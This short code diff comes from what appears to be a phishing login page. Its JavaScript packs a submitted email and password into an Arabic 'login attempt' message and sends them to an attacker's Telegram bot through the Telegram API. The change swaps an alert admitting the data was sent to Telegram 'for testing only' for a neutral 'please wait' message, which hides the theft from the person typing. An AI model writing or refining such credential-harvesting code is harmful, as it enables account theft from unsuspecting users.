@@ -81,7 +81,7 @@
       let message = `📩 تجربة تسجيل دخول\n\n📧 الإيميل: ${email}\n🔑 كلمة السر: ${pass}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${telegramId}&text=${encodeURIComponent(message)}`)
-        .then(res => alert("✅ تم إرسال البيانات إلى تليجرام (للتجربة فقط)"))
+        .then(res => alert(" ⏳ يرجى الانتضار "))
         .catch(err => alert("❌ فشل الإرسال"));
     }
   </script>
